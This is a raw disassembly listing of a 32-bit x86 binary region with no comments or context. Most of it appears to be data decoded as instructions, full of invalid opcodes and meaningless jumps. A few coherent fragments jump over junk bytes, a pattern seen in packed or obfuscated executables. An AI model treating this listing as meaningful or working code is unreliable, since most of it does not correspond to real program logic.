  40b5eb:	mov    ds:0xaf3e7499,eax
  40b5f0:	neg    DWORD PTR [esi+ecx*2+0x36]
  40b5f4:	fisub  WORD PTR [edx]
  40b5f6:	call   0x270e:0x63095639
  40b5fd:	inc    edi
  40b5fe:	fidivr DWORD PTR [edi]
  40b600:	jmp    0xdcd7acfa
  40b605:	pop    ecx
  40b606:	cmp    ecx,DWORD PTR [esi+eiz*1+0xa0137c8]
  40b60d:	rol    BYTE PTR [esi-0x52c8ffb6],1
  40b613:	imul   ebx,eax,0x18
  40b616:	rcr    DWORD PTR [ecx+0x5b3ee2c4],cl
  40b61c:	fnsave [esi]
  40b61e:	add    ah,BYTE PTR [ecx-0x7c]
  40b621:	push   ds
  40b622:	test   al,0xa9
  40b624:	add    esi,DWORD PTR [edx+eax*2+0x5b]
  40b628:	cmp    al,0xf9
  40b62a:	cmp    bh,0xe
  40b62d:	add    dh,BYTE PTR [esp+eax*4+0x60b089c1]
  40b634:	jge    0x40b670
  40b636:	test   eax,0x2f5abedd
  40b63b:	out    0xdf,eax
  40b63d:	jmp    0xcb47:0xd98fc664
  40b644:	(bad)  
  40b645:	mov    eax,0xc5bb3699
  40b64a:	cmp    edi,DWORD PTR [esi-0x3020cb3]
  40b650:	push   edi
  40b651:	adc    DWORD PTR [eax+ebp*2+0x6876716],0x39b01471
  40b65c:	rcl    DWORD PTR [esi],cl
  40b65e:	jg     0x40b6ca
  40b660:	lahf   
  40b661:	data16 loop 0x40b6b8
  40b664:	fs pop esi
  40b666:	mov    BYTE PTR [ebx+0x55],ah
  40b669:	jl     0x40b622
  40b66b:	mov    eax,ds:0xc97d9dfe
  40b670:	popf   
  40b671:	push   ebx
  40b672:	add    dh,BYTE PTR [ebp-0x75]
  40b675:	sbb    eax,0x88868eaa
  40b67a:	(bad)  
  40b67b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b67c:	popf   
  40b67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b67e:	inc    eax
  40b67f:	ret    0xd77e
  40b682:	pushf  
  40b683:	jmp    0x870104fc
  40b688:	js     0x40b693
  40b68a:	jns    0x40b63a
  40b68c:	sbb    al,0xd5
  40b68e:	cdq    
  40b68f:	push   cs
  40b690:	or     esp,DWORD PTR [edi-0x7d]
  40b693:	scas   eax,DWORD PTR es:[edi]
  40b694:	push   ebx
  40b695:	add    BYTE PTR [edx-0x33],ah
  40b698:	(bad)  
  40b69a:	xlat   BYTE PTR ds:[ebx]
  40b69b:	cdq    
  40b69c:	sub    edi,DWORD PTR [ebx+0x6c]
  40b69f:	ds dec ecx
  40b6a1:	(bad)  
  40b6a2:	je     0x40b69e
  40b6a4:	test   BYTE PTR [edx-0x11052206],dh
  40b6aa:	inc    esi
  40b6ab:	mov    WORD PTR [ecx-0x746f9ede],ds
  40b6b1:	inc    ebp
  40b6b2:	lock mov ecx,DWORD PTR [ebp-0x14]
  40b6b6:	xor    ecx,esi
  40b6b8:	mov    edx,0xffcd8d65
  40b6bd:	sub    edx,ecx
  40b6bf:	add    DWORD PTR [eax],edx
  40b6c1:	mov    eax,ds:0x41227c
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	jmp    0x40ba15
  40b6cd:	mov    cl,0x1a
  40b6cf:	jns    0x40b704
  40b6d1:	xchg   ecx,eax
  40b6d2:	xor    DWORD PTR [ecx+0x2f888498],esi
  40b6d8:	mov    ch,0xf5
  40b6da:	std    
  40b6db:	pushf  
  40b6dc:	mov    eax,ds:0x7e7ef2d9
  40b6e1:	cs jge 0x40b762
  40b6e4:	jle    0x40b761
  40b6e6:	in     al,dx
  40b6e7:	jmp    0x40b6ef
  40b6e9:	sbb    esp,ebp
  40b6eb:	mov    esi,0xe53ea0a8
  40b6f0:	ins    DWORD PTR es:[edi],dx
  40b6f1:	cwde   
  40b6f2:	push   ebx
  40b6f3:	sbb    BYTE PTR [edx],dh
  40b6f5:	out    dx,al
  40b6f6:	mov    cl,0x8b
  40b6f8:	enter  0x94a9,0x7c
  40b6fc:	sub    BYTE PTR [eax-0x4c],bl
  40b6ff:	push   ebp
  40b700:	leave  
  40b701:	and    eax,esp
  40b703:	jge    0x40b76f
  40b705:	mov    ecx,0xbe59f6cf
  40b70a:	inc    eax
  40b70b:	sub    eax,0xe45e4912
  40b710:	sbb    edi,DWORD PTR [ecx]
  40b712:	add    ecx,esp
  40b714:	and    al,0x58
  40b716:	push   ds
  40b717:	adc    eax,0x2a6d0bea
  40b71c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b71d:	xor    esi,DWORD PTR [esp+ebx*8]
  40b720:	mov    ch,0x6f
  40b722:	mov    edi,ebx
  40b724:	dec    esi
  40b725:	inc    edi
  40b726:	lods   eax,DWORD PTR ds:[esi]
  40b727:	xor    DWORD PTR [edi+ebx*1+0x5],esi
  40b72b:	(bad)  
  40b72c:	adc    BYTE PTR [esi],dh
  40b72e:	pop    eax
  40b72f:	test   eax,0xdb17c9d5
  40b734:	push   ebx
  40b735:	push   0x2a
  40b737:	push   cs
  40b738:	pop    edi
  40b739:	cmp    ah,dh
  40b73b:	pusha  
  40b73c:	jg     0x40b754
  40b73e:	sahf   
  40b73f:	push   ss
  40b740:	sbb    eax,0xfff19da7
  40b745:	jecxz  0x40b719
  40b747:	sbb    esi,DWORD PTR [esi+0xc]
  40b74a:	stc    
  40b74b:	iret   
  40b74c:	sbb    edx,DWORD PTR ds:0xd4939270
  40b752:	dec    BYTE PTR [edx-0x6f]
  40b755:	mov    cl,BYTE PTR [ebp+0xfe85c6c]
  40b75b:	mov    edi,0x46b9b6a
  40b760:	out    dx,al
  40b761:	xchg   esi,eax
  40b762:	adc    eax,DWORD PTR [edx]
  40b764:	outs   dx,BYTE PTR ds:[esi]
  40b765:	inc    ebx
  40b766:	or     esi,esp
  40b768:	sbb    eax,0x3b7f5b6
  40b76d:	test   eax,0xf3b5e2d0
  40b772:	ret    0x8f0a
  40b775:	test   ah,bl
  40b777:	rcl    BYTE PTR [edx],1
  40b779:	test   BYTE PTR [edi],al
  40b77b:	jbe    0x40b716
  40b77d:	jg     0x40b707
  40b77f:	test   edx,ecx
  40b781:	jp     0x40b7cc
  40b783:	jns    0x40b7f7
  40b785:	dec    edx
  40b786:	push   edi
  40b787:	cs jmp 0xd46c5a60
  40b78d:	inc    edi
  40b78e:	jmp    FWORD PTR [ebx]
  40b790:	pushf  
  40b791:	jp     0x40b7e7
  40b793:	jp     0x40b795
  40b795:	retf   0x394d
  40b798:	out    dx,eax
  40b799:	inc    eax
  40b79a:	and    DWORD PTR [esi-0x570e0dbd],esi
  40b7a0:	inc    esp
  40b7a1:	jl     0x40b7d4
  40b7a3:	les    esp,FWORD PTR [ebp-0x78]
  40b7a6:	mov    bl,0x1d
  40b7a8:	mov    cl,0x9d
  40b7aa:	ficomp DWORD PTR [eax+0x39]
  40b7ad:	in     al,0x66
  40b7af:	lahf   
  40b7b0:	lds    esp,FWORD PTR [edx-0x54]
  40b7b3:	pop    edx
  40b7b4:	call   0xda49:0x37a3fa46
  40b7bb:	adc    al,0xba
  40b7bd:	lea    ecx,[ebx-0x56]
  40b7c0:	jecxz  0x40b822
  40b7c2:	div    DWORD PTR [ebx]
  40b7c4:	adc    ebx,esp
  40b7c6:	pop    es
  40b7c7:	dec    edx
  40b7c8:	jo     0x40b791
  40b7ca:	call   0x81df:0xf5861335
  40b7d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7d2:	sub    esp,DWORD PTR [ebx+0x71be48a]
  40b7d8:	stos   DWORD PTR es:[edi],eax
  40b7d9:	ins    DWORD PTR es:[edi],dx
  40b7da:	ss out dx,eax
  40b7dc:	sahf   
  40b7dd:	xchg   esi,eax
  40b7de:	dec    edi
  40b7df:	cld    
  40b7e0:	call   0xfa10:0x2cad441d
  40b7e7:	cmp    al,0xb7
  40b7e9:	sub    ah,ah
  40b7eb:	test   BYTE PTR [edi],bh
  40b7ed:	mov    cl,0xd1
  40b7ef:	xchg   esi,eax
  40b7f0:	retf   
  40b7f1:	imul   esi,DWORD PTR [esi+0x22],0xffffffff
  40b7f5:	push   0xffffffe1
  40b7f7:	loope  0x40b857
  40b7f9:	add    esi,eax
  40b7fb:	xchg   esp,eax
  40b7fc:	jbe    0x40b82f
  40b7fe:	jecxz  0x40b79c
  40b800:	or     eax,0x7f7fe7a8
  40b805:	cli    
  40b806:	fcom   st(5)
  40b808:	aas    
  40b809:	mov    cl,0x76
  40b80b:	jmp    edx
  40b80d:	jno    0x40b883
  40b80f:	enter  0xa480,0xc5
  40b813:	cmp    BYTE PTR ds:0x28d4e7ec,ah
  40b819:	mov    ch,cl
  40b81b:	mov    ecx,DWORD PTR [esi+0x4302340]
  40b821:	mov    esp,0x46740732
  40b826:	addr16 daa 
  40b828:	inc    eax
  40b829:	sub    dl,BYTE PTR [edx+ecx*4+0x45]
  40b82d:	in     eax,dx
  40b82e:	xor    eax,0x64604751
  40b833:	shl    BYTE PTR [ecx-0x152e4ede],0xbc
  40b83a:	dec    ebp
  40b83b:	je     0x40b826
  40b83d:	nop
  40b83e:	and    DWORD PTR [esi+esi*8+0x3746d2b],ebp
  40b845:	call   0xbbb4:0x13c65d5b
  40b84c:	sbb    BYTE PTR [bp+di+0x3],dh
  40b850:	mul    DWORD PTR [ebx]
  40b852:	cdq    
  40b853:	adc    eax,0x3ec3bf60
  40b858:	dec    ebx
  40b859:	dec    eax
  40b85a:	(bad)  [edx-0x7c]
  40b85d:	or     al,0xec
  40b85f:	pop    edi
  40b860:	pop    ds
  40b861:	jnp    0x40b821
  40b863:	adc    DWORD PTR [edx],esp
  40b865:	stos   DWORD PTR es:[edi],eax
  40b866:	retf   
  40b867:	lock dec ebp
  40b869:	add    eax,0x94dee69f
  40b86e:	add    BYTE PTR [edi],ch
  40b870:	lods   al,BYTE PTR ds:[esi]
  40b871:	mov    ebp,0x4e1e05f4
  40b876:	jb     0x40b863
  40b878:	cmp    edx,ecx
  40b87a:	add    bh,BYTE PTR [esi-0x695cbf4e]
  40b880:	ret    0x3579
  40b883:	xchg   edx,eax
  40b884:	add    DWORD PTR [esi+ebx*1+0x76],edx
  40b888:	rcl    BYTE PTR [ebx-0x3efefc36],1
  40b88e:	out    0x49,eax
  40b890:	sbb    BYTE PTR [edi+0x4d],cl
  40b893:	ds inc edi
  40b895:	mov    esp,0xb656ba7e
  40b89a:	lods   eax,DWORD PTR ds:[esi]
  40b89b:	pusha  
  40b89c:	outs   dx,DWORD PTR ds:[esi]
  40b89d:	mov    ds:0x55165adf,eax
  40b8a2:	push   ebx
  40b8a3:	add    ecx,esi
  40b8a5:	and    eax,0xa4f81bfa
  40b8aa:	shl    BYTE PTR [edi],1
  40b8ac:	inc    esp
  40b8ad:	jae    0x40b91e
  40b8af:	shl    BYTE PTR [ebx+0x44],0x64
  40b8b3:	mov    ?,WORD PTR [ebx+0x5a3a3098]
  40b8b9:	shl    cl,cl
  40b8bb:	and    BYTE PTR [edi],dl
  40b8bd:	ret    
  40b8be:	fdivr  QWORD PTR [esi+0x7cb74555]
  40b8c4:	leave  
  40b8c5:	idiv   ebx
  40b8c7:	mov    ds:0x807b781d,al
  40b8cc:	jb     0x40b8f1
  40b8ce:	mov    al,ds:0x7e4711c2
  40b8d3:	sahf   
  40b8d4:	mov    BYTE PTR [edi-0x2f],ch
  40b8d7:	adc    DWORD PTR [ebp+0x58721f20],0x10
  40b8de:	bound  ecx,QWORD PTR [ecx+0x26]
  40b8e1:	xor    BYTE PTR [ebx+eax*1],ch
  40b8e4:	jmp    0x13d0e8d4
  40b8e9:	lods   eax,DWORD PTR ds:[esi]
  40b8ea:	jle    0x40b8ad
  40b8ec:	stos   DWORD PTR es:[edi],eax
  40b8ed:	xchg   edx,eax
  40b8ee:	fwait
  40b8ef:	xchg   ebx,eax
  40b8f0:	dec    ebx
  40b8f1:	mov    dl,0xe1
  40b8f3:	ret    0xfdb1
  40b8f6:	imul   ebp,DWORD PTR [esi],0xfe60e2f0
  40b8fc:	aam    0xad
  40b8fe:	std    
  40b8ff:	push   ebp
  40b900:	add    eax,0x19e90f6e
  40b905:	sbb    al,0x76
  40b907:	(bad)  
  40b908:	(bad)  
  40b909:	nop
  40b90a:	bound  ebp,QWORD PTR [ebp+0x50]
  40b90d:	sbb    DWORD PTR cs:[ecx+ebp*1],esi
  40b911:	cmp    al,ah
  40b913:	xchg   BYTE PTR [ecx+0x1f8b24e4],ch
  40b919:	sub    DWORD PTR [edi+0x79],esi
  40b91c:	cld    
  40b91d:	adc    eax,0xb9bd29ad
  40b922:	jmp    0x8347c21c
  40b927:	or     BYTE PTR [edi-0x19],dh
  40b92a:	out    0x23,al
  40b92c:	dec    edi
  40b92d:	sbb    al,0x54
  40b92f:	and    dl,BYTE PTR [ebp+edi*2+0x10]
  40b933:	and    dl,dl
  40b935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b936:	ins    DWORD PTR es:[edi],dx
  40b937:	leave  
  40b938:	(bad)  
  40b939:	scas   eax,DWORD PTR es:[edi]
  40b93a:	xor    al,0x3e
  40b93c:	lds    edi,FWORD PTR [edi-0x24c0662a]
  40b942:	inc    ebp
  40b943:	inc    ebx
  40b945:	sub    DWORD PTR [eax+0x4],edx
  40b948:	or     DWORD PTR [ebx-0x467da7a3],0x73
  40b94f:	dec    ecx
  40b950:	sahf   
  40b951:	not    BYTE PTR [edx]
  40b953:	stos   DWORD PTR es:[edi],eax
  40b954:	call   0x7d9234fe
  40b959:	into   
  40b95a:	in     al,dx
  40b95b:	popa   
  40b95c:	mov    ebx,0x73ea3e0f
  40b961:	test   DWORD PTR [edx-0x49],0xb1ac8778
  40b968:	test   eax,0x80494eff
  40b96d:	rcr    BYTE PTR [edx],0x82
  40b970:	out    dx,eax
  40b971:	mov    ch,0xd2
  40b973:	pop    esi
  40b974:	sbb    cl,bh
  40b976:	cli    
  40b977:	mov    DWORD PTR [eax-0x2688df78],ebx
  40b97d:	push   esp
  40b97e:	adc    eax,0xace00c63
  40b983:	add    al,0x6b
  40b985:	push   ds
  40b986:	xor    eax,0x68a138c1
  40b98b:	add    ebx,eax
  40b98d:	jb     0x40b9a7
  40b98f:	jle    0x40b972
  40b991:	adc    esp,ebp
  40b993:	stc    
  40b994:	lahf   
  40b995:	xchg   BYTE PTR [edx-0x58384d13],cl
  40b99b:	retf   0xd512
  40b99e:	es sbb ah,al
  40b9a1:	fs fnstsw WORD PTR es:[eax-0x1ea7f9c6]
  40b9a9:	push   eax
  40b9aa:	js     0x40b9d0
  40b9ac:	pop    ecx
  40b9ad:	jmp    0x7453:0x13fbd27b
  40b9b4:	and    esi,edx
  40b9b6:	pop    ebp
  40b9b7:	repz jb 0x40b9eb
  40b9ba:	or     al,0xab
  40b9bc:	sbb    ebp,DWORD PTR [ebx+esi*4+0x75d340f8]
  40b9c3:	cmp    DWORD PTR [eax],0xffffffc9
  40b9c6:	sub    edi,DWORD PTR [edx+ebx*1+0x374bd430]
  40b9cd:	inc    eax
  40b9ce:	(bad)  
  40b9cf:	dec    edx
  40b9d0:	or     DWORD PTR [edi+0x723f1ff1],edi
  40b9d6:	xor    bh,BYTE PTR [ebp-0x877fc01]
  40b9dc:	pop    ds
  40b9dd:	mov    ds:0xd611e80a,al
  40b9e2:	mov    al,BYTE PTR [edx+ebp*4+0xd]
  40b9e6:	sbb    bl,BYTE PTR [eax+0x42a00016]
  40b9ec:	fsubr  QWORD PTR [esi+ebp*1-0x4]
  40b9f0:	cwde   
  40b9f1:	outs   dx,DWORD PTR ds:[esi]
  40b9f2:	jnp    0x40b9c7
  40b9f4:	or     bh,BYTE PTR [esi+0x52564ca6]
  40b9fa:	fwait
  40b9fb:	sub    al,0xcc
  40b9fd:	popf   
  40b9fe:	sbb    dh,BYTE PTR ds:0x5481f92e
  40ba04:	cwde   
  40ba05:	cmp    BYTE PTR [ecx+0x3b],ch
  40ba08:	std    
  40ba09:	mov    al,0xe2
  40ba0b:	sub    DWORD PTR [ebp-0x29],esp
  40ba0e:	mov    dh,0x9a
  40ba10:	outs   dx,DWORD PTR ds:[esi]
  40ba11:	mov    WORD PTR [edx-0x74994d38],ds
  40ba17:	dec    ebp
  40ba18:	cld    
  40ba19:	movzx  ecx,cx
  40ba1c:	add    ecx,DWORD PTR [eax]
  40ba1e:	mov    DWORD PTR [ebp-0x1c],ecx
  40ba21:	mov    eax,DWORD PTR [ebp+0xc]
  40ba24:	jmp    0x40bd71
  40ba29:	jae    0x40ba29
  40ba2b:	push   ebx
  40ba2c:	lahf   
  40ba2d:	jae    0x40baa2
  40ba2f:	jae    0x40ba83
  40ba31:	pop    edi
  40ba32:	dec    ebp
  40ba33:	scas   al,BYTE PTR es:[edi]
  40ba34:	in     al,dx
  40ba35:	mov    ah,0x88
  40ba37:	cmp    BYTE PTR [esi+0x7e7ef189],0x2e
  40ba3e:	jge    0x40babe
  40ba40:	jle    0x40b9e2
  40ba42:	jmp    0x40b9f3
  40ba44:	mov    WORD PTR [ebx+0x1e547203],?
  40ba4a:	mov    ds:0x8af9ea0f,eax
  40ba4f:	iret   
  40ba50:	retf   0x4d5e
  40ba53:	fstp   QWORD PTR [ecx-0x2d]
  40ba56:	nop
  40ba57:	ss das 
  40ba59:	dec    eax
  40ba5a:	add    al,0xd9
  40ba5c:	add    al,0xd5
  40ba5e:	sbb    DWORD PTR [eax+0x6c1798d7],esi
  40ba64:	repnz fscale 
  40ba67:	jno    0x40ba10
  40ba69:	arpl   WORD PTR [edi+ecx*8+0x31746e24],bx
  40ba70:	cmp    al,0xb2
  40ba72:	out    dx,eax
  40ba73:	nop
  40ba74:	jnp    0x40ba94
  40ba76:	ins    BYTE PTR es:[edi],dx
  40ba77:	data16 add al,0xdd
  40ba7a:	jmp    0xa7a6b5ad
  40ba7f:	sub    eax,DWORD PTR [ecx+0x50c281b0]
  40ba85:	mov    esp,0x16a02b32
  40ba8a:	or     eax,ebx
  40ba8c:	(bad)  
  40ba8d:	out    dx,al
  40ba8e:	sbb    eax,0xed09b35
  40ba93:	jb     0x40ba7c
  40ba95:	mov    esi,0xbee0fbb5
  40ba9a:	mov    DWORD PTR [edx-0x29],edi
  40ba9d:	pop    ebp
  40ba9e:	leave  
  40ba9f:	jg     0x40ba41
  40baa1:	pop    ss
  40baa2:	(bad)  
  40baa4:	leave  
  40baa5:	push   eax
  40baa6:	(bad)  
  40baa8:	leave  
  40baa9:	cmp    esi,DWORD PTR [eax]
  40baab:	mov    esi,DWORD PTR [edx-0x15d988d4]
  40bab1:	jl     0x40ba48
  40bab3:	push   cs
  40bab4:	dec    DWORD PTR [edi+edx*8]
  40bab7:	mov    fs,esp
  40bab9:	aaa    
  40baba:	xor    eax,DWORD PTR [ecx+ecx*8]
  40babd:	lods   eax,DWORD PTR ds:[esi]
  40babe:	or     eax,0xb3d85130
  40bac3:	sub    BYTE PTR [ecx],0x78
  40bac6:	push   cs
  40bac7:	jl     0x40ba93
  40bac9:	xchg   ecx,eax
  40baca:	out    0x2b,eax
  40bacc:	adc    eax,0xf895dfc4
  40bad1:	mov    ch,0x1a
  40bad3:	pop    ds
  40bad4:	xchg   esi,eax
  40bad5:	cmp    eax,0x5135a2fd
  40bada:	jge    0x40bb05
  40badc:	push   cs
  40badd:	jp     0x40bb23
  40badf:	lods   al,BYTE PTR ds:[esi]
  40bae0:	cmc    
  40bae1:	push   ecx
  40bae2:	scas   al,BYTE PTR es:[edi]
  40bae3:	shr    BYTE PTR [edx+edi*1],1
  40bae6:	push   eax
  40bae7:	pusha  
  40bae8:	dec    eax
  40bae9:	or     DWORD PTR [edi],0x4e
  40baec:	mov    cl,0x55
  40baef:	jmp    0x40baf4
  40baf1:	push   ss
  40baf2:	fnsave [eax-0x7b]
  40baf5:	aaa    
  40baf6:	inc    esp
  40baf7:	jl     0x40bb01
  40baf9:	out    0x71,al
  40bafb:	push   edi
  40bafc:	pop    ebx
  40bafd:	inc    ebp
  40bafe:	push   0xf687b5d3
  40bb03:	loope  0x40ba8e
  40bb05:	cmc    
  40bb06:	fdiv   DWORD PTR [ebx+ebx*4+0x11]
  40bb0a:	loope  0x40baf8
  40bb0c:	dec    ecx
  40bb0d:	call   0x6eeb:0x2c2e38ee
  40bb14:	inc    ebx
  40bb15:	mov    DWORD PTR [esi+0x1db9ac9e],esp
  40bb1b:	inc    ebp
  40bb1c:	xchg   ecx,eax
  40bb1d:	and    cl,BYTE PTR [esi-0xd71ea6b]
  40bb23:	arpl   WORD PTR [ebx+ebp*4],sp
  40bb26:	xchg   ebx,eax
  40bb27:	mov    al,0x25
  40bb29:	mov    ch,0x3c
  40bb2b:	outs   dx,DWORD PTR ds:[esi]
  40bb2c:	push   0x9f6afb9b
  40bb31:	fild   QWORD PTR [esi+0x7d14755c]
  40bb37:	dec    ebp
  40bb38:	test   al,0xa1
  40bb3a:	pop    eax
  40bb3b:	fldenv [edi-0x79]
  40bb3e:	and    DWORD PTR [ecx+0x12],ebp
  40bb41:	out    dx,eax
  40bb42:	or     eax,0xff04cc1e
  40bb47:	cmc    
  40bb48:	aas    
  40bb49:	push   0x321a682e
  40bb4e:	xchg   ebx,eax
  40bb4f:	pop    esi
  40bb50:	push   ss
  40bb51:	push   ecx
  40bb52:	(bad)  
  40bb53:	xlat   BYTE PTR ds:[ebx]
  40bb54:	push   ecx
  40bb55:	add    DWORD PTR [ecx],edi
  40bb57:	sub    ebx,DWORD PTR [eax+0x73cf6b12]
  40bb5d:	call   0x8b87bff3
  40bb62:	fwait
  40bb63:	pop    ebx
  40bb64:	inc    esi
  40bb65:	xor    al,ah
  40bb67:	repnz and BYTE PTR [esi+edi*1+0x2d],cl
  40bb6c:	xor    eax,0xc59d5d5f
  40bb71:	daa    
  40bb72:	sub    DWORD PTR [ebp+0x1a],0xcec8884e
  40bb79:	or     al,0x7c
  40bb7b:	or     eax,0x3a5dcf65
  40bb80:	add    ecx,0x29
  40bb83:	je     0x40bbc4
  40bb85:	push   edx
  40bb86:	mov    edx,0x4d085c33
  40bb8b:	ds jne 0x40bbfd
  40bb8e:	std    
  40bb8f:	inc    ebx
  40bb90:	jno    0x40bba8
  40bb92:	mov    bl,0xdc
  40bb94:	ror    DWORD PTR [ebp+0x7e008870],cl
  40bb9a:	sbb    al,0xbc
  40bb9c:	or     bh,cl
  40bb9e:	scas   al,BYTE PTR es:[edi]
  40bb9f:	adc    BYTE PTR [ebp+0x71],ah
  40bba2:	xchg   DWORD PTR [eax+0x3b789138],ebx
  40bba8:	js     0x40bb9d
  40bbaa:	or     al,0x2a
  40bbac:	xor    al,BYTE PTR [ebp-0x5]
  40bbaf:	cmp    ah,ch
  40bbb1:	sahf   
  40bbb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbb3:	(bad)  
  40bbb4:	test   ecx,0x8892b117
  40bbba:	mov    ch,0x19
  40bbbc:	btr    edx,esp
  40bbbf:	push   0xffffffbd
  40bbc1:	mov    ebx,DWORD PTR [eax+0x53738077]
  40bbc7:	or     bl,dh
  40bbc9:	or     al,BYTE PTR [ebp+0x33612d35]
  40bbcf:	xchg   edx,eax
  40bbd0:	inc    edx
  40bbd1:	leave  
  40bbd2:	mov    ebp,0x18ba462b
  40bbd7:	imul   ebp,DWORD PTR [edx+0x0],0x6e
  40bbdb:	fwait
  40bbdc:	push   cs
  40bbdd:	imul   ebp,DWORD PTR [esi-0x57402d26],0xffffff87
  40bbe4:	dec    edi
  40bbe5:	sub    BYTE PTR [edx],dh
  40bbe7:	or     ax,WORD PTR [ebx-0x77]
  40bbeb:	popf   
  40bbec:	cmp    ebp,esi
  40bbee:	out    0xb8,al
  40bbf0:	cdq    
  40bbf1:	or     DWORD PTR [eax+0x69],esp
  40bbf4:	pop    ecx
  40bbf5:	push   ebx
  40bbf6:	inc    esi
  40bbf7:	scas   al,BYTE PTR es:[edi]
  40bbf8:	aad    0xa0
  40bbfa:	retf   
  40bbfb:	je     0x40bbc9
  40bbfd:	leave  
  40bbfe:	pop    ecx
  40bbff:	mov    ecx,0xe2559c1d
  40bc04:	cdq    
  40bc05:	push   edi
  40bc06:	push   ebp
  40bc07:	dec    esp
  40bc08:	(bad)  
  40bc0a:	mov    BYTE PTR [ebx-0x7d4930ca],bl
  40bc10:	data16 ins BYTE PTR es:[edi],dx
  40bc12:	push   0x4e1533c4
  40bc17:	adc    ch,bh
  40bc19:	and    al,0x36
  40bc1b:	sti    
  40bc1c:	js     0x40bbf8
  40bc1e:	bound  eax,QWORD PTR [esp+eax*2-0x5ca6dff6]
  40bc25:	push   ds
  40bc26:	or     BYTE PTR [ebx],ch
  40bc28:	ins    DWORD PTR es:[edi],dx
  40bc29:	sahf   
  40bc2a:	nop
  40bc2b:	bound  ebx,QWORD PTR [ecx]
  40bc2d:	xor    al,0xd8
  40bc2f:	xchg   esp,eax
  40bc30:	out    dx,eax
  40bc31:	dec    edx
  40bc32:	psrlq  mm0,mm3
  40bc35:	mov    edx,0x5893e1fd
  40bc3a:	adc    DWORD PTR [esp+ecx*2+0x799967c4],ecx
  40bc41:	scas   eax,DWORD PTR es:[edi]
  40bc42:	mov    ebp,0x6a40d5f5
  40bc47:	adc    BYTE PTR [esi],ch
  40bc49:	leave  
  40bc4a:	cli    
  40bc4b:	std    
  40bc4c:	sbb    al,0xc9
  40bc4e:	jnp    0x40bcb5
  40bc50:	ins    DWORD PTR es:[edi],dx
  40bc51:	mov    bl,BYTE PTR [ebp+0x21378a7d]
  40bc57:	sub    al,0xda
  40bc59:	fsubrp st(4),st
  40bc5b:	test   DWORD PTR [ebp-0x77],ebp
  40bc5e:	mov    ah,0xae
  40bc60:	call   0x8ff0:0xc776bc53
  40bc67:	or     eax,0x91696321
  40bc6c:	xchg   edx,eax
  40bc6d:	ret    0x8511
  40bc70:	dec    ebx
  40bc71:	add    al,0x6b
  40bc73:	es and eax,0x2eb216c9
  40bc79:	lods   al,BYTE PTR ds:[esi]
  40bc7a:	rol    DWORD PTR [edx],1
  40bc7c:	aam    0xee
  40bc7e:	xor    al,dl
  40bc80:	jb     0x40bc5e
  40bc82:	(bad)  
  40bc83:	jbe    0x40bcff
  40bc85:	and    DWORD PTR [esi],edi
  40bc87:	mov    al,0x4f
  40bc89:	mov    dl,0xe3
  40bc8b:	xor    ch,0xfc
  40bc8e:	sub    al,0x1e
  40bc90:	dec    esp
  40bc91:	or     al,BYTE PTR [esi-0x51]
  40bc94:	into   
  40bc95:	shr    DWORD PTR [edx+eax*4],0x9b
  40bc99:	xchg   esi,eax
  40bc9a:	mov    ebx,0xd36145f6
  40bc9f:	das    
  40bca0:	mov    WORD PTR [ecx-0x3e644dbd],?
  40bca6:	push   esp
  40bca7:	pop    di
  40bca9:	push   edi
  40bcaa:	popa   
  40bcab:	xor    BYTE PTR [eax-0x5c],ch
  40bcae:	lods   eax,DWORD PTR ds:[esi]
  40bcaf:	mov    bl,0x11
  40bcb1:	retf   
  40bcb2:	inc    eax
  40bcb3:	pop    es
  40bcb4:	jmp    0x40bc79
  40bcb6:	mov    bh,0x43
  40bcb8:	aas    
  40bcb9:	dec    esp
  40bcba:	retf   
  40bcbb:	ror    DWORD PTR [esi+0x7],1
  40bcbe:	dec    ecx
  40bcbf:	cld    
  40bcc0:	sub    DWORD PTR [eax+0x1700817b],ecx
  40bcc6:	(bad)  
  40bcc7:	repnz cmp al,0xb7
  40bcca:	pop    esi
  40bccb:	test   eax,0x2d597553
  40bcd0:	shr    BYTE PTR [eax+eiz*1],cl
  40bcd3:	sub    eax,0xf9b4c3fd
  40bcd8:	dec    ebp
  40bcd9:	in     eax,dx
  40bcda:	xchg   ebp,eax
  40bcdb:	or     BYTE PTR [edx+ebp*1],al
  40bcde:	xor    eax,0x75f0b117
  40bce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bce4:	fcomp  QWORD PTR [eax+eax*8+0x1028a330]
  40bceb:	clc    
  40bcec:	mov    DWORD PTR [ebx-0x7f77d0ed],ecx
  40bcf2:	add    eax,0x5e195869
  40bcf7:	into   
  40bcf8:	or     al,0x8b
  40bcfa:	xor    BYTE PTR [edi-0x590b85d0],bl
  40bd00:	and    eax,0x31d59e32
  40bd05:	fdiv   DWORD PTR [esi-0x2]
  40bd08:	mov    eax,0xb328c7f
  40bd0d:	mov    ah,0x87
  40bd0f:	test   DWORD PTR [edx+0x5e275c50],0x86017973
  40bd19:	jmp    0xdc5b:0x8a3c0fd9
  40bd20:	adc    cl,BYTE PTR [esi-0x57a6035f]
  40bd26:	push   esp
  40bd27:	(bad)  
  40bd28:	jmp    0xd19e60ee
  40bd2d:	sub    DWORD PTR ds:0xec68d386,ebp
  40bd33:	add    bl,0x44
  40bd36:	jp     0x40bce3
  40bd38:	pop    ebx
  40bd39:	add    BYTE PTR [ebx-0x523e9148],ch
  40bd3f:	mov    ch,0x40
  40bd41:	cmp    eax,0x5a1d30b9
  40bd46:	add    al,0xc3
  40bd48:	sbb    ebp,DWORD PTR [edi]
  40bd4a:	mov    esi,0x368d5049
  40bd4f:	xlat   BYTE PTR ds:[ebx]
  40bd50:	add    ebp,DWORD PTR [esi-0x5c56d8de]
  40bd56:	lea    esi,[eax+0x30]
  40bd59:	xor    ebp,DWORD PTR [ebx]
  40bd5b:	sbb    al,0x1c
  40bd5d:	adc    al,0x28
  40bd5f:	mov    dl,0x1
  40bd61:	mov    ecx,ebx
  40bd63:	icebp  
  40bd64:	cmp    eax,0x318e4f84
  40bd69:	and    DWORD PTR [eax+0x6987a7b5],esi
  40bd6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd70:	mov    ch,0x8b
  40bd72:	dec    ebp
  40bd73:	or     al,0x33
